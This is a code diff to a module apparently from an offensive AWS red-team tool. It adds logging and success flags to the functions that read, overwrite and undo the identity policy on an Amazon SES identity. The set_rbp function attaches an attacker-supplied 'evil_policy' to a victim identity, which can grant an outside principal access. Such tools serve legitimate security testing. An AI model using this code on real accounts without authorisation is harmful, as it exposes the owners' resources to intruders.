@@ -10,6 +10,7 @@ from endgame.exposure_via_resource_policies.common import ResourceType, Resource
 from endgame.shared.policy_document import PolicyDocument
 from endgame.shared.response_message import ResponseMessage
 from endgame.shared.list_resources_response import ListResourcesResponse
+from endgame.shared.response_message import ResponseGetRbp
 
 logger = logging.getLogger(__name__)
 
@@ -39,9 +40,10 @@ class SesIdentityPolicy(ResourceType, ABC):
             policy_names = []
         return policy_names
 
-    def _get_rbp(self) -> PolicyDocument:
+    def _get_rbp(self) -> ResponseGetRbp:
         """Get the resource based policy for this resource and store it"""
         # If you do not know the names of the policies that are attached to the identity, you can use ListIdentityPolicies
+        logger.debug("Getting resource policy for %s" % self.arn)
         try:
             # https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ses.html#SES.Client.list_identity_policies
             response = self.client.list_identity_policies(Identity=self.name)
@@ -53,9 +55,11 @@ class SesIdentityPolicy(ResourceType, ABC):
                 policy = json.loads(policies.get(constants.SID_SIGNATURE))
             else:
                 policy = constants.get_empty_policy()
+            success = True
         except botocore.exceptions.ClientError:
             # When there is no policy, let's return an empty policy to avoid breaking things
             policy = constants.get_empty_policy()
+            success = False
         policy_document = PolicyDocument(
             policy=policy,
             service=self.service,
@@ -64,17 +68,21 @@ class SesIdentityPolicy(ResourceType, ABC):
             override_resource_block=self.override_resource_block,
             override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
         )
-        return policy_document
+        response = ResponseGetRbp(policy_document=policy_document, success=success)
+        return response
 
     def set_rbp(self, evil_policy: dict) -> ResponseMessage:
+        logger.debug("Setting resource policy for %s" % self.arn)
         new_policy = json.dumps(evil_policy)
         try:
             self.client.put_identity_policy(Identity=self.arn, PolicyName=constants.SID_SIGNATURE, Policy=new_policy)
             # https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ses.html#SES.Client.put_identity_policy
             message = "success"
+            success = True
         except botocore.exceptions.ClientError as error:
             message = str(error)
-        response_message = ResponseMessage(message=message, operation="set_rbp", evil_principal="",
+            success = False
+        response_message = ResponseMessage(message=message, operation="set_rbp", success=success, evil_principal="",
                                            victim_resource_arn=self.arn, original_policy=self.original_policy,
                                            updated_policy=evil_policy, resource_type=self.resource_type,
                                            resource_name=self.name, service=self.service)
@@ -82,6 +90,7 @@ class SesIdentityPolicy(ResourceType, ABC):
 
     def undo(self, evil_principal: str, dry_run: bool = False) -> ResponseMessage:
         """Wraps client.delete_identity_policy"""
+        logger.debug(f"Removing {evil_principal} from {self.arn}")
         new_policy = {
             "Version": "2012-10-17",
             "Statement": []
@@ -89,19 +98,26 @@ class SesIdentityPolicy(ResourceType, ABC):
         # https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ses.html#SES.Client.delete_identity_policy
         operation = "UNDO"
         # Update the list of identity policies
+        success = True
         if constants.SID_SIGNATURE in self._identity_policy_names():
             if not dry_run:
-                # TODO: Error handling for setting policy
-                self.client.delete_identity_policy(
-                    Identity=self.name,
-                    PolicyName=constants.SID_SIGNATURE
-                )
-                message = f"200: Removed identity policy called {constants.SID_SIGNATURE} for identity {self.name}"
+                try:
+                    self.client.delete_identity_policy(
+                        Identity=self.name,
+                        PolicyName=constants.SID_SIGNATURE
+                    )
+                    message = f"200: Removed identity policy called {constants.SID_SIGNATURE} for identity {self.name}"
+                    success = True
+                except botocore.exceptions.ClientError as error:
+                    success = False
+                    message = error
+                    logger.critical(f"Operation was not successful for {self.service} {self.resource_type} "
+                                    f"{self.name}. %s" % error)
             else:
                 message = f"202: Dry run: will remove identity policy called {constants.SID_SIGNATURE} for identity {self.name}"
         else:
             message = f"404: There is no policy titled {constants.SID_SIGNATURE} attached to {self.name}"
-        response_message = ResponseMessage(message=message, operation=operation, evil_principal=evil_principal,
+        response_message = ResponseMessage(message=message, operation=operation, success=success, evil_principal=evil_principal,
                                            victim_resource_arn=self.arn, original_policy=self.original_policy,
                                            updated_policy=new_policy, resource_type=self.resource_type,
                                            resource_name=self.name, service=self.service)
